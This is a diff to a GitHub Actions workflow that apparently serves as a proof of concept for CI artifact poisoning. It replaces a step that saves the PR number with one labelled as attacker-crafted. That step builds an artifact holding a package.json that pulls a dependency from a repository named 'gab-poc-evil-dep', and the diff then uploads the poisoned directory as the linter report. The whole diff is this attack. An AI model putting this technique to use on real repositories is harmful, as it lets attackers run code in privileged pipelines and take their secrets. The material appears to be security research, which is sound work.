@@ -8,17 +8,27 @@ jobs:
   lint:
     runs-on: ubuntu-latest
     steps:
-      - name: Save PR number
-        if: always()
-        env:
-          PR_NUMBER: ${{ github.event.pull_request.number }}
-        run: echo "$PR_NUMBER" > pr-number.txt
+      - name: Craft artifact payload (attacker controls artifact contents)
+        run: |
+          mkdir -p out
+          printf 'Attacker-supplied linter report body (v2).\n' > out/linter-report.txt
+          echo "${{ github.event.pull_request.number }}" > out/pr-number.txt
+          cat > out/package.json <<'JSON'
+          {
+            "name": "linter-workspace",
+            "version": "1.0.0",
+            "private": true,
+            "dependencies": {
+              "helper": "github:PDFtoMark/gab-poc-evil-dep"
+            }
+          }
+          JSON
+          ls -la out
 
       - name: Upload linter report
         if: always()
         uses: actions/upload-artifact@v7
         with:
           name: linter-report
-          path: |
-            pr-number.txt
+          path: out
           if-no-files-found: ignore
